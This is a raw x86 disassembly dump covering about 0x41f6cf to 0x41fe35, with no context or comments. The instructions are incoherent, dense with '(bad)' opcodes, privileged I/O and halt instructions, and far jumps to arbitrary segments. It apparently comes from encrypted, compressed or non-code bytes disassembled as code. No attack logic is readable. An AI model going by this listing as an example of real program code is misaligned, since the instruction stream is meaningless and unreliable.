  41f6cf:	imul   ecx,DWORD PTR [ebx+0x7e6b7dc5],0xb47578df
  41f6d9:	cmc    
  41f6da:	hlt    
  41f6db:	es adc eax,0x8e69496e
  41f6e1:	ss cmp ch,0x56
  41f6e5:	mov    edx,0xe0393e28
  41f6ea:	shr    ecx,1
  41f6ec:	les    edx,FWORD PTR [edx+0x7debb7e9]
  41f6f2:	add    cl,BYTE PTR [edi]
  41f6f4:	jge    0x41f770
  41f6f6:	fs jp  0x41f70e
  41f6f9:	inc    edi
  41f6fa:	and    BYTE PTR [edi],ch
  41f6fc:	jmp    0x41f694
  41f6fe:	mov    DWORD PTR [ebx+esi*4-0x6865dfdf],edx
  41f705:	fsub   QWORD PTR [esi+ecx*4+0x5d133453]
  41f70c:	add    cl,bl
  41f70e:	das    
  41f70f:	pop    es
  41f710:	add    DWORD PTR [edi],edi
  41f712:	pop    es
  41f713:	arpl   WORD PTR [eax],di
  41f715:	mov    ds:0xabefbcf0,al
  41f71a:	pop    edi
  41f71b:	pop    eax
  41f71c:	jnp    0x41f6a3
  41f71e:	sbb    al,BYTE PTR [eax+0x34]
  41f721:	mov    ch,0xc9
  41f723:	scas   al,BYTE PTR es:[edi]
  41f724:	leave  
  41f725:	mov    ch,0x9d
  41f727:	or     al,bh
  41f729:	out    0xbd,al
  41f72b:	xor    ebp,esp
  41f72d:	repnz sahf 
  41f72f:	add    al,0x67
  41f731:	leave  
  41f732:	jb     0x41f77d
  41f734:	test   al,0x8b
  41f736:	push   cs
  41f737:	mov    ebx,0xc0ade3b5
  41f73c:	fwait
  41f73d:	push   eax
  41f73e:	gs (bad) 
  41f741:	arpl   WORD PTR [edi+esi*1+0x69],ax
  41f745:	sbb    DWORD PTR [esi+0x5cb1f15],esp
  41f74b:	das    
  41f74c:	dec    ebx
  41f74d:	daa    
  41f74e:	sbb    DWORD PTR [eax+0x6c],edi
  41f751:	stc    
  41f752:	add    BYTE PTR [edi-0x7b],ah
  41f755:	jb     0x41f72b
  41f757:	add    DWORD PTR [ecx-0x6b],ebp
  41f75a:	lea    eax,[eax+0x50d4da1e]
  41f760:	lahf   
  41f761:	mov    bl,0x3f
  41f763:	shr    BYTE PTR [esi],0x9b
  41f766:	mov    bl,0x72
  41f768:	pop    ecx
  41f769:	test   DWORD PTR [edx+0x6485f3fd],edi
  41f76f:	mov    esi,0x320a417a
  41f774:	retf   
  41f775:	mov    dh,0x9d
  41f777:	pop    ss
  41f778:	mov    ebx,gs
  41f77a:	rcr    ah,cl
  41f77c:	mov    esp,0x4c520b90
  41f781:	jmp    0x3877860a
  41f786:	leave  
  41f787:	test   eax,0x922906b3
  41f78c:	shl    esp,0x81
  41f78f:	or     DWORD PTR [eax+0x58cdd364],eax
  41f795:	out    0x54,eax
  41f797:	sbb    DWORD PTR [edx-0x590abf9a],edx
  41f79d:	int3   
  41f79e:	xlat   BYTE PTR ds:[ebx]
  41f79f:	scas   al,BYTE PTR es:[edi]
  41f7a0:	mov    ch,0xa9
  41f7a2:	enter  0xc53c,0x2b
  41f7a6:	cmp    bl,BYTE PTR [ecx+0x42]
  41f7a9:	cmp    esp,DWORD PTR [ebx]
  41f7ab:	jl     0x41f7c2
  41f7ad:	lods   eax,DWORD PTR ds:[esi]
  41f7ae:	mov    ecx,0xba30a81d
  41f7b3:	xor    ebp,DWORD PTR [edi]
  41f7b5:	pop    edi
  41f7b6:	xlat   BYTE PTR ds:[ebx]
  41f7b7:	test   dh,0x5
  41f7ba:	cld    
  41f7bb:	inc    ebx
  41f7bc:	push   ebx
  41f7bd:	icebp  
  41f7be:	sar    BYTE PTR [esi-0x5d2363b7],1
  41f7c4:	inc    ebp
  41f7c5:	sbb    eax,0x40e0d867
  41f7cb:	retf   
  41f7cc:	push   cs
  41f7cd:	ins    DWORD PTR es:[edi],dx
  41f7ce:	daa    
  41f7cf:	loopne 0x41f845
  41f7d1:	mov    ebp,0x7ae14e30
  41f7d6:	mov    eax,0x274f2b46
  41f7db:	push   ebx
  41f7dc:	or     bh,ah
  41f7de:	sub    edx,esp
  41f7e0:	rcr    BYTE PTR [ebp-0x47708384],1
  41f7e6:	test   eax,0x4fa89cf9
  41f7eb:	cs push esp
  41f7ed:	test   eax,0xa24d5647
  41f7f2:	pop    es
  41f7f3:	xor    dl,BYTE PTR [edi]
  41f7f5:	xor    al,0xb5
  41f7f7:	cld    
  41f7f8:	jbe    0x41f7fd
  41f7fa:	adc    cl,bl
  41f7fc:	jmp    0x41f7eb
  41f7fe:	and    bh,BYTE PTR [esi+0x1a6c09e3]
  41f804:	or     eax,0x90ca23f
  41f809:	adc    dl,ah
  41f80b:	fist   WORD PTR [edx+edx*2+0x3ab29366]
  41f812:	stos   DWORD PTR es:[edi],eax
  41f813:	mov    eax,ds:0x446f6741
  41f818:	mov    edx,0x48d6a718
  41f81d:	fstp   DWORD PTR [ebx-0x6d]
  41f820:	repz jbe 0x41f85f
  41f823:	sub    DWORD PTR [bx+si-0x65e0],0x28
  41f829:	fs lock fcmovb st,st(0)
  41f82d:	sub    BYTE PTR [esi+0x2edeec53],ch
  41f833:	mov    dh,ch
  41f835:	data16 loope 0x41f824
  41f838:	add    cl,BYTE PTR [esi+0x63d67685]
  41f83e:	popf   
  41f83f:	addr16 ja 0x41f88e
  41f842:	jo     0x41f86a
  41f844:	xchg   ecx,eax
  41f845:	jbe    0x41f855
  41f847:	and    BYTE PTR [ebx+0x2fb23724],cl
  41f84d:	jns    0x41f803
  41f84f:	mov    al,ds:0x11ec655a
  41f854:	and    al,0x5f
  41f856:	sbb    al,0xf5
  41f858:	lods   eax,DWORD PTR ds:[esi]
  41f859:	pop    ebp
  41f85a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f85b:	adc    ch,bh
  41f85d:	imul   esp,ebx,0xffffff9a
  41f860:	pop    esi
  41f861:	rcr    BYTE PTR [ebx+0x10],1
  41f864:	pop    ss
  41f865:	dec    ebp
  41f866:	inc    edx
  41f867:	retf   
  41f868:	(bad)  
  41f869:	cmp    esi,edx
  41f86b:	mov    bh,0x5f
  41f86d:	xchg   esp,eax
  41f86e:	into   
  41f86f:	fsub   QWORD PTR [edx]
  41f871:	call   0x9268f35c
  41f876:	je     0x41f863
  41f878:	pop    ds
  41f879:	shr    BYTE PTR [ebx+0x6e],1
  41f87c:	xchg   BYTE PTR [bp+si+0x445d],dh
  41f881:	or     DWORD PTR [ecx-0x5b3fc7b5],0xffffff9a
  41f888:	inc    ebp
  41f889:	out    0x9b,al
  41f88b:	or     bl,BYTE PTR [ebx+0x75]
  41f88e:	icebp  
  41f88f:	clc    
  41f890:	cmp    dl,BYTE PTR [eax]
  41f892:	aas    
  41f893:	gs stc 
  41f895:	repz test BYTE PTR [edx+eiz*8],ch
  41f899:	push   0x5327b4f8
  41f89e:	sbb    al,0x39
  41f8a0:	mov    fs,esi
  41f8a2:	sbb    ch,0x95
  41f8a5:	ins    DWORD PTR es:[edi],dx
  41f8a6:	add    DWORD PTR [esi-0x114d7baa],0xfffffff0
  41f8ad:	icebp  
  41f8ae:	sbb    BYTE PTR [edx+0x6a8acaa1],ch
  41f8b4:	jmp    0x41f8f5
  41f8b6:	ja     0x41f8b5
  41f8b8:	clc    
  41f8b9:	xor    eax,0x362e9b57
  41f8be:	mov    ebp,0xc6d4c7a9
  41f8c3:	adc    edx,DWORD PTR [ebp+0x367387f8]
  41f8c9:	pop    es
  41f8ca:	icebp  
  41f8cb:	push   esi
  41f8cc:	cmp    BYTE PTR [esp+esi*2+0x56a131f5],0x1d
  41f8d4:	aas    
  41f8d5:	popf   
  41f8d6:	mov    cl,0xe7
  41f8d8:	sbb    al,0xd8
  41f8da:	mov    gs,WORD PTR [esi+ebp*4-0x3705ae60]
  41f8e1:	mov    edi,0xc237fbb8
  41f8e6:	call   0x5275cf80
  41f8eb:	lods   al,BYTE PTR ds:[esi]
  41f8ec:	or     al,0xbf
  41f8ee:	dec    edi
  41f8ef:	retf   
  41f8f0:	or     edi,DWORD PTR [esi]
  41f8f2:	add    eax,esi
  41f8f4:	out    dx,eax
  41f8f5:	mov    ds:0x581633cf,eax
  41f8fa:	cmp    al,BYTE PTR [edi*4-0x28fc901b]
  41f901:	dec    eax
  41f902:	jns    0x41f8c7
  41f904:	sub    edx,DWORD PTR [edx]
  41f906:	mov    ch,BYTE PTR [esi-0x20123e88]
  41f90c:	dec    esi
  41f90d:	rcr    cl,0xc5
  41f910:	inc    ebx
  41f911:	call   0xecee:0xac0d2944
  41f918:	mov    bl,0x94
  41f91a:	sub    al,0x86
  41f91c:	retf   
  41f91d:	xchg   esi,eax
  41f91e:	adc    bl,BYTE PTR [edi]
  41f920:	in     al,dx
  41f921:	dec    esp
  41f922:	pop    esi
  41f923:	jle    0x41f969
  41f925:	(bad)  
  41f926:	mov    eax,0x34eea596
  41f92b:	shl    DWORD PTR es:[ecx],0xfb
  41f92f:	sub    dl,BYTE PTR [edi-0x41]
  41f932:	sub    ebx,DWORD PTR [edx+0x5b]
  41f935:	and    cl,bh
  41f937:	push   ecx
  41f938:	inc    ebp
  41f939:	rcr    ah,1
  41f93b:	mov    ebx,0xaa7c276b
  41f940:	jmp    0x47df19c1
  41f945:	fwait
  41f946:	jmp    0x345be127
  41f94b:	loop   0x41f9c1
  41f94d:	and    bh,BYTE PTR [ebp-0x2c70333a]
  41f953:	mov    dh,0x61
  41f955:	jmp    0x41f90a
  41f957:	repnz hlt 
  41f959:	push   ds
  41f95a:	xor    ebx,DWORD PTR [edx]
  41f95c:	dec    ebp
  41f95d:	retf   
  41f95e:	inc    esp
  41f95f:	cli    
  41f960:	jg     0x41f950
  41f962:	aas    
  41f963:	scas   eax,DWORD PTR es:[edi]
  41f964:	mov    ds:0x86b08b2a,eax
  41f969:	lods   al,BYTE PTR ds:[esi]
  41f96a:	pusha  
  41f96b:	or     bh,BYTE PTR [ebp-0x6b4e531f]
  41f971:	and    BYTE PTR [eax-0x3d],al
  41f974:	cmp    eax,0xb90a05d6
  41f979:	dec    ecx
  41f97a:	fsub   DWORD PTR [ebx-0x4c]
  41f97d:	inc    eax
  41f97e:	xor    ah,BYTE PTR [ecx-0x75]
  41f981:	out    dx,al
  41f982:	iret   
  41f983:	sbb    DWORD PTR [edx],esi
  41f985:	or     bh,BYTE PTR [ecx-0x129f1598]
  41f98b:	pop    ecx
  41f98c:	sahf   
  41f98d:	ja     0x41f97e
  41f98f:	push   es
  41f990:	(bad)  [edi+0x12546927]
  41f996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f997:	add    BYTE PTR gs:[edx+0x5dfacd66],0x9
  41f99f:	dec    esp
  41f9a0:	add    ch,BYTE PTR [ecx+0x76f50f22]
  41f9a6:	(bad)  
  41f9a7:	sub    eax,0x36b4147a
  41f9ac:	int3   
  41f9ad:	jae    0x41f95b
  41f9af:	push   cs
  41f9b0:	ficomp DWORD PTR [edx]
  41f9b2:	jbe    0x41f995
  41f9b4:	ds sbb ecx,DWORD PTR gs:[edi]
  41f9b8:	das    
  41f9b9:	pop    ss
  41f9ba:	aam    0x22
  41f9bc:	out    0xb1,al
  41f9be:	test   al,0xb1
  41f9c0:	mov    ebx,0x9d70d6ac
  41f9c5:	cmp    eax,0x53478601
  41f9ca:	sbb    eax,0xac938ca5
  41f9cf:	cs push cs
  41f9d1:	mov    esp,ds
  41f9d3:	mov    cl,0xdf
  41f9d5:	bound  ebx,QWORD PTR [ebx+eiz*2]
  41f9d8:	inc    ecx
  41f9d9:	rcl    DWORD PTR [ebp-0x1f86d4f0],0xbb
  41f9e0:	or     DWORD PTR [edi+eax*1],ebp
  41f9e3:	retf   0x19ae
  41f9e6:	push   0x6d167759
  41f9eb:	inc    ebx
  41f9ec:	mov    ds:0xffaf24a,al
  41f9f1:	fisub  DWORD PTR [edi+0x7e3bdb04]
  41f9f7:	add    DWORD PTR [edx-0x7f],0x2fcfe80d
  41f9fe:	inc    esp
  41f9ff:	mov    BYTE PTR [edi-0x667839b3],al
  41fa05:	add    DWORD PTR [eax+0x77],ebx
  41fa08:	cmp    eax,DWORD PTR [ebp-0x3740b14d]
  41fa0e:	and    al,0x97
  41fa10:	push   ebp
  41fa11:	xchg   esi,eax
  41fa12:	das    
  41fa13:	mov    edx,DWORD PTR [ebp-0x34]
  41fa16:	mov    dl,0x87
  41fa18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa19:	arpl   WORD PTR [ebx],bp
  41fa1b:	gs xchg edi,eax
  41fa1d:	lds    esi,FWORD PTR ds:0xd7a9b65
  41fa23:	(bad)  [esi+0x13]
  41fa26:	in     al,dx
  41fa27:	sbb    DWORD PTR ds:0x1aab4c8b,esp
  41fa2d:	pop    DWORD PTR [edx+0x5c879691]
  41fa33:	fs push ds
  41fa35:	sub    al,0x86
  41fa37:	sbb    eax,0xff667b84
  41fa3c:	fcmove st,st(3)
  41fa3e:	fild   DWORD PTR [ebx+0x50]
  41fa41:	xor    esp,DWORD PTR [edx+0x6e]
  41fa44:	jmp    DWORD PTR [ebp-0x334798cc]
  41fa4a:	(bad)  
  41fa4b:	test   al,0x6f
  41fa4d:	shl    BYTE PTR [esi+0x101eaf46],0xae
  41fa54:	mov    ebp,0x8b9fc8c6
  41fa59:	les    eax,FWORD PTR [ebx+edi*4-0x4424e8af]
  41fa60:	in     eax,0x51
  41fa62:	rcl    BYTE PTR [ecx+0x4d3c3c08],cl
  41fa68:	popa   
  41fa69:	jb     0x41fa87
  41fa6b:	pop    edi
  41fa6c:	fst    QWORD PTR [edx]
  41fa6e:	dec    edi
  41fa6f:	adc    DWORD PTR [ebx-0x2857bf8f],ecx
  41fa75:	les    eax,FWORD PTR [edx-0x21b35df6]
  41fa7b:	mov    esp,0xdb6e6f40
  41fa80:	add    DWORD PTR [edi],edi
  41fa82:	sbb    ch,ah
  41fa84:	cmp    al,ch
  41fa86:	xchg   edx,eax
  41fa87:	sbb    bl,BYTE PTR [edi]
  41fa89:	clc    
  41fa8a:	cmc    
  41fa8b:	cs pop ds
  41fa8d:	xchg   ebx,eax
  41fa8e:	pop    ebp
  41fa8f:	xchg   esi,eax
  41fa90:	adc    al,0x9b
  41fa92:	aas    
  41fa93:	mov    bl,0x92
  41fa95:	fwait
  41fa96:	jbe    0x41fa59
  41fa98:	stc    
  41fa99:	bound  edx,QWORD PTR [ebx-0x6]
  41fa9c:	inc    edx
  41fa9d:	push   cs
  41fa9e:	sbb    BYTE PTR ds:0x5740e64b,0xf0
  41faa5:	fsub   st(2),st
  41faa7:	mov    edx,0x707f5ec7
  41faac:	jle    0x41fa98
  41faae:	jnp    0x41fa5b
  41fab0:	xor    eax,0x640e3f6b
  41fab5:	sub    BYTE PTR [edi],bl
  41fab7:	pop    esi
  41fab8:	cdq    
  41fab9:	push   esp
  41faba:	pop    eax
  41fabb:	mov    dh,0x2f
  41fabd:	cmp    eax,0x758ae2ce
  41fac2:	dec    edx
  41fac3:	int    0x5a
  41fac5:	jl     0x41fa5e
  41fac7:	lock pushf 
  41fac9:	dec    ch
  41facb:	jnp    0x41fb2f
  41facd:	sub    eax,0xb3198e84
  41fad2:	aas    
  41fad3:	ret    0xa5a8
  41fad6:	hlt    
  41fad7:	out    0x5b,al
  41fad9:	cmc    
  41fada:	dec    ebp
  41fadb:	in     al,dx
  41fadc:	std    
  41fadd:	push   dx
  41fadf:	pop    ss
  41fae0:	lea    edi,[edx+eax*4]
  41fae3:	das    
  41fae4:	pop    edx
  41fae5:	adc    DWORD PTR [ebp+edi*8-0x1ddd2924],eax
  41faec:	ret    0xb31c
  41faef:	mov    bh,0x47
  41faf1:	(bad)  
  41faf2:	jne    0x41fad6
  41faf4:	sub    eax,0xaa72860b
  41faf9:	cmp    eax,0x677adf4a
  41fafe:	pusha  
  41faff:	rol    DWORD PTR [eax+0x51],0x4f
  41fb03:	scas   eax,DWORD PTR es:[edi]
  41fb04:	pusha  
  41fb05:	in     al,0xfc
  41fb07:	mov    dl,0xcf
  41fb09:	loop   0x41fadf
  41fb0b:	sar    BYTE PTR [ecx+0x5a],1
  41fb0e:	pop    edx
  41fb0f:	ror    DWORD PTR [edx-0x1eadce51],cl
  41fb15:	fld    QWORD PTR [edx]
  41fb17:	mov    ds:0x1c197d13,al
  41fb1c:	jb     0x41fb0e
  41fb1e:	inc    ebx
  41fb1f:	xchg   edx,eax
  41fb20:	xor    al,0x70
  41fb22:	in     eax,dx
  41fb23:	push   0xa32f40be
  41fb28:	loope  0x41fad9
  41fb2a:	cdq    
  41fb2b:	sbb    cl,bh
  41fb2d:	ror    BYTE PTR [ecx-0x65df878c],0x6c
  41fb34:	ins    BYTE PTR es:[edi],dx
  41fb35:	push   di
  41fb37:	pop    esp
  41fb38:	xlat   BYTE PTR ds:[ebx]
  41fb39:	push   0xfffffff7
  41fb3b:	sahf   
  41fb3c:	xor    DWORD PTR [eax-0x23477b01],esp
  41fb42:	push   eax
  41fb43:	mov    bh,0x46
  41fb45:	(bad)  
  41fb46:	scas   al,BYTE PTR es:[edi]
  41fb47:	pop    ds
  41fb48:	lods   al,BYTE PTR ds:[esi]
  41fb49:	les    esi,FWORD PTR [edx-0x18]
  41fb4c:	mov    fs,WORD PTR [eax]
  41fb4e:	adc    DWORD PTR [eax],0x60
  41fb51:	repz and ah,BYTE PTR [esi-0x5b]
  41fb55:	xor    DWORD PTR [edx+0x64],edx
  41fb58:	pop    ds
  41fb59:	jl     0x41fb6d
  41fb5b:	out    dx,eax
  41fb5c:	shl    DWORD PTR [ebx+0x14],1
  41fb5f:	xor    al,0xe7
  41fb61:	xchg   ebp,eax
  41fb62:	jne    0x41fb43
  41fb64:	enter  0x9427,0xca
  41fb68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb69:	repz mov bl,BYTE PTR [esi-0x68285d83]
  41fb70:	jmp    0x41fb2b
  41fb72:	pop    eax
  41fb73:	xor    ch,BYTE PTR [edi+0x2b]
  41fb76:	xchg   esp,eax
  41fb77:	call   0x5ec7010b
  41fb7c:	jmp    0x41fb14
  41fb7e:	adc    eax,0x98960741
  41fb83:	(bad)  
  41fb84:	pop    ebx
  41fb85:	lods   eax,DWORD PTR ds:[esi]
  41fb86:	jno    0x41fb8f
  41fb88:	(bad)  ds:0xf9ba669d
  41fb8e:	push   cs
  41fb8f:	jecxz  0x41fb6c
  41fb91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb92:	push   eax
  41fb93:	dec    ecx
  41fb94:	icebp  
  41fb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb96:	cmp    BYTE PTR [ecx+0x1d],dh
  41fb99:	mov    esp,DWORD PTR [esi+eiz*8-0x6a]
  41fb9d:	mov    edi,0x3f9010b
  41fba2:	and    cl,bh
  41fba4:	rcl    BYTE PTR [ebp+0x7452b1ae],1
  41fbaa:	enter  0xe9ca,0x40
  41fbae:	inc    edx
  41fbaf:	sub    ah,0xeb
  41fbb2:	stos   BYTE PTR es:[edi],al
  41fbb3:	jb     0x41fbd3
  41fbb5:	or     eax,0x3556e2f9
  41fbba:	sub    esi,DWORD PTR [ecx]
  41fbbc:	out    0x22,eax
  41fbbe:	cmp    BYTE PTR [ebp+ebx*4-0x666fc3c8],dl
  41fbc5:	stos   BYTE PTR es:[edi],al
  41fbc6:	push   ebx
  41fbc7:	fild   QWORD PTR [eax+0x7a]
  41fbca:	sbb    ch,BYTE PTR [ebp-0x28017345]
  41fbd0:	push   ebp
  41fbd1:	bound  eax,QWORD PTR [edx]
  41fbd3:	mov    al,0x4f
  41fbd5:	adc    esp,DWORD PTR [ebx+esi*4+0x50]
  41fbd9:	lods   eax,DWORD PTR ds:[esi]
  41fbda:	out    dx,al
  41fbdb:	arpl   WORD PTR [ebx+0x30],bp
  41fbde:	lahf   
  41fbdf:	lock (bad) 
  41fbe1:	pop    ds
  41fbe2:	cwde   
  41fbe3:	lds    ebp,FWORD PTR [edx-0x33440d7a]
  41fbe9:	inc    esp
  41fbea:	pop    edi
  41fbeb:	cmp    DWORD PTR [esi+0x56],esi
  41fbee:	and    ah,BYTE PTR [esi-0x1b3e7d5f]
  41fbf4:	mov    BYTE PTR [ecx+0x4dfbcd5f],ch
  41fbfa:	stos   DWORD PTR es:[edi],eax
  41fbfb:	mov    bh,0x21
  41fbfd:	dec    esi
  41fbfe:	adc    al,0x3f
  41fc00:	pop    esi
  41fc01:	dec    esp
  41fc02:	jecxz  0x41fba6
  41fc04:	js     0x41fba8
  41fc06:	jbe    0x41fb95
  41fc08:	cwde   
  41fc09:	cs sub ebp,ebp
  41fc0c:	pop    ebx
  41fc0d:	fistp  QWORD PTR [edi+ebp*2]
  41fc10:	inc    edx
  41fc11:	(bad)  
  41fc12:	sub    edi,edx
  41fc14:	icebp  
  41fc15:	and    esp,0xffffffa5
  41fc18:	push   esi
  41fc19:	mov    ds:0x8b07485e,eax
  41fc1e:	xchg   BYTE PTR [ecx-0x9770d4f],bl
  41fc24:	sub    eax,0x1391990e
  41fc29:	add    eax,0x3a5573c1
  41fc2e:	(bad)  
  41fc2f:	sub    DWORD PTR [edi-0x4779b969],esp
  41fc35:	es jbe 0x41fbf8
  41fc38:	test   BYTE PTR [edx],cl
  41fc3a:	in     al,dx
  41fc3b:	sub    DWORD PTR ds:0x698f2dd7,ebx
  41fc41:	push   ss
  41fc42:	pop    ebx
  41fc43:	in     eax,0x47
  41fc45:	imul   edi,ecx,0xc12308bb
  41fc4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc4c:	fiadd  WORD PTR [ecx]
  41fc4e:	ror    DWORD PTR [ebp-0x36],cl
  41fc51:	jp     0x41fbe1
  41fc53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc54:	js     0x41fbfd
  41fc56:	xchg   BYTE PTR [ecx-0xa],ah
  41fc59:	sbb    DWORD PTR [esi-0x38],0xee5dba97
  41fc60:	fst    DWORD PTR [esp+ebp*1]
  41fc63:	push   edi
  41fc64:	nop
  41fc65:	and    DWORD PTR [ebp-0x1e],ebp
  41fc68:	pop    ebx
  41fc69:	cmp    BYTE PTR [edx-0x3f548931],bh
  41fc6f:	iret   
  41fc70:	stc    
  41fc71:	jo     0x41fc2d
  41fc73:	add    BYTE PTR [ebx-0x23c38a0e],ah
  41fc79:	xchg   BYTE PTR [ebx+ebp*2-0x5da6912c],bl
  41fc80:	stos   BYTE PTR es:[edi],al
  41fc81:	jnp    0x41fce2
  41fc83:	xchg   esi,eax
  41fc84:	lods   eax,DWORD PTR ds:[esi]
  41fc85:	or     BYTE PTR [ebx+0x6],0x4a
  41fc89:	cmp    al,BYTE PTR [ebp-0x51]
  41fc8c:	fmul   QWORD PTR [edx+0xffdb354]
  41fc92:	mov    esi,0xcc7b3c01
  41fc97:	cmp    BYTE PTR [esp+ebp*8+0xa],bh
  41fc9b:	stos   BYTE PTR es:[edi],al
  41fc9c:	xor    BYTE PTR [edi],dl
  41fc9e:	push   ebx
  41fc9f:	jno    0x41fc41
  41fca1:	(bad)  
  41fca2:	in     eax,dx
  41fca3:	xchg   BYTE PTR [edi],bh
  41fca5:	enter  0x3592,0xe5
  41fca9:	adc    DWORD PTR [ecx+0x1a352299],ebp
  41fcaf:	aad    0xbf
  41fcb1:	xor    eax,0x423c2dbd
  41fcb6:	xchg   esi,eax
  41fcb7:	push   eax
  41fcb8:	jmp    0x41fc42
  41fcba:	data16 sbb cl,BYTE PTR [edx-0x2ab71fbc]
  41fcc1:	in     eax,dx
  41fcc2:	pop    edx
  41fcc3:	retf   
  41fcc4:	jp     0x41fc8f
  41fcc6:	in     al,0x53
  41fcc8:	ror    BYTE PTR [eax+0x5497f328],cl
  41fcce:	fmul   DWORD PTR [ebx]
  41fcd0:	loop   0x41fc60
  41fcd2:	das    
  41fcd3:	inc    eax
  41fcd4:	je     0x41fd15
  41fcd6:	cmp    BYTE PTR [ebp-0x9],al
  41fcd9:	jmp    0x41fd53
  41fcdb:	in     eax,dx
  41fcdc:	xor    dl,ch
  41fcde:	stos   DWORD PTR es:[edi],eax
  41fcdf:	iret   
  41fce0:	mov    ah,0x29
  41fce2:	cmp    ah,bh
  41fce4:	das    
  41fce5:	mov    ebx,ebp
  41fce7:	xchg   edx,eax
  41fce8:	mov    dh,0x17
  41fcea:	call   0xc4a4:0x73781b99
  41fcf1:	xor    DWORD PTR [edx-0x2c],ecx
  41fcf4:	aad    0x2b
  41fcf6:	and    al,0x3b
  41fcf8:	xchg   edi,eax
  41fcf9:	dec    edi
  41fcfa:	jae    0x41fd76
  41fcfc:	mov    edi,0x8e84c05
  41fd01:	inc    ecx
  41fd02:	mov    esp,DWORD PTR [ebx]
  41fd04:	add    DWORD PTR [esi-0x4797c572],edx
  41fd0a:	add    DWORD PTR [eax+esi*8-0x48],ecx
  41fd0e:	data16 xor al,0xff
  41fd11:	iret   
  41fd12:	push   es
  41fd13:	jg     0x41fd90
  41fd15:	(bad)  
  41fd16:	mov    dh,BYTE PTR [edx+edi*1-0x4fc70e27]
  41fd1d:	sub    al,0x82
  41fd1f:	loope  0x41fcb2
  41fd21:	and    ebp,DWORD PTR [ecx+0xc]
  41fd24:	aas    
  41fd25:	push   cs
  41fd26:	sub    al,0xef
  41fd28:	aam    0x82
  41fd2a:	sub    DWORD PTR [eax+0x16],esi
  41fd2d:	jle    0x41fd2d
  41fd2f:	sub    ebx,DWORD PTR [eax-0x3cee3da1]
  41fd35:	ror    BYTE PTR [esi],1
  41fd37:	or     DWORD PTR [ebx],esi
  41fd39:	mov    dh,0x4a
  41fd3b:	ficomp WORD PTR [ecx+ecx*4]
  41fd3e:	lods   eax,DWORD PTR ds:[esi]
  41fd3f:	sbb    BYTE PTR [esi-0x57],ch
  41fd42:	mov    bh,0xeb
  41fd44:	xor    ebp,esp
  41fd46:	sbb    dh,dh
  41fd48:	lods   al,BYTE PTR ds:[esi]
  41fd49:	mov    eax,ds:0xfb9144f
  41fd4e:	lods   al,BYTE PTR ds:[esi]
  41fd4f:	into   
  41fd50:	popa   
  41fd51:	xchg   edi,eax
  41fd52:	xor    BYTE PTR [ecx+eax*2+0x36],dh
  41fd56:	rcl    ebx,0x67
  41fd59:	mov    ch,0x32
  41fd5b:	adc    DWORD PTR [esi+0x71],0xa
  41fd5f:	scas   al,BYTE PTR es:[edi]
  41fd60:	inc    eax
  41fd61:	inc    esp
  41fd62:	sbb    BYTE PTR [edx-0x40],al
  41fd65:	mov    ?,WORD PTR [esi-0x27]
  41fd68:	sar    DWORD PTR [ebp+0x732039d1],cl
  41fd6e:	cmp    cl,bh
  41fd70:	rcr    DWORD PTR [esi+0x750ba475],1
  41fd76:	and    DWORD PTR [eax+0x33ec4ccf],0xffffff98
  41fd7d:	ret    0x427c
  41fd80:	pushf  
  41fd81:	test   BYTE PTR [ebx-0x44369d54],ch
  41fd87:	inc    edi
  41fd88:	imul   edi,esp,0x69
  41fd8b:	push   ebp
  41fd8c:	pushw  ss
  41fd8e:	sub    al,0x5e
  41fd90:	sub    BYTE PTR [esi-0x5d],0xd6
  41fd94:	pop    ds
  41fd95:	inc    edx
  41fd96:	jg     0x41fd4b
  41fd98:	xchg   ebp,eax
  41fd99:	adc    eax,0xdf39e7ec
  41fd9e:	(bad)
  41fda1:	hlt    
  41fda2:	jecxz  0x41fd52
  41fda4:	cs mov esi,0xc29eef11
  41fdaa:	add    esp,DWORD PTR [ebp-0xd9e41d2]
  41fdb0:	cs or  al,al
  41fdb3:	ret    
  41fdb4:	add    al,0x3
  41fdb6:	or     al,0xfb
  41fdb8:	sahf   
  41fdb9:	xchg   DWORD PTR [ecx],ebx
  41fdbb:	xchg   esi,eax
  41fdbc:	fbstp  TBYTE PTR ss:[edi-0x2ca52ab9]
  41fdc3:	or     al,0x53
  41fdc5:	dec    eax
  41fdc6:	sub    al,0x48
  41fdc8:	pop    ecx
  41fdc9:	inc    ebx
  41fdca:	xchg   edi,eax
  41fdcb:	jmp    FWORD PTR [ebp-0x4c]
  41fdce:	push   es
  41fdcf:	jae    0x41fd86
  41fdd1:	popf   
  41fdd2:	mov    eax,0x476bdddd
  41fdd7:	fldcw  WORD PTR [ebx+0x31f98f8]
  41fddd:	loope  0x41fdd5
  41fddf:	sub    DWORD PTR [eax+ecx*8+0x6e],esp
  41fde3:	into   
  41fde4:	ret    
  41fde5:	or     BYTE PTR [ecx],ch
  41fde7:	inc    edx
  41fde8:	push   ecx
  41fde9:	mov    al,ds:0x9769b0ad
  41fdee:	xchg   esi,esp
  41fdf0:	inc    eax
  41fdf1:	fwait
  41fdf2:	outs   dx,DWORD PTR ds:[esi]
  41fdf3:	nop
  41fdf4:	jne    0x41fe32
  41fdf6:	cmp    ebx,edi
  41fdf8:	pop    ecx
  41fdf9:	mov    ch,0x29
  41fdfb:	outs   dx,DWORD PTR ds:[esi]
  41fdfc:	call   0x26fd32af
  41fe01:	std    
  41fe02:	sub    BYTE PTR [edi+0x32],bh
  41fe05:	dec    edx
  41fe06:	pop    ebp
  41fe07:	mov    ebx,0x5377fb01
  41fe0c:	cli    
  41fe0d:	or     BYTE PTR [edi],cl
  41fe0f:	jle    0x41fe62
  41fe11:	shl    BYTE PTR [edi],1
  41fe13:	lea    edi,[esp+edi*8+0x6a]
  41fe17:	sbb    DWORD PTR [edi-0x4b],ebx
  41fe1a:	jmp    0x8062:0xd3b42d12
  41fe21:	aad    0x4b
  41fe23:	mov    ebp,esp
  41fe25:	mov    al,0x6e
  41fe27:	xor    edx,ecx
  41fe29:	lea    ebx,[edx+0xe]
  41fe2c:	sbb    eax,0x74e163d9
  41fe31:	and    al,0xc3
  41fe33:	es dec ebx
  41fe35:	mov    ecx,0x11b0b119
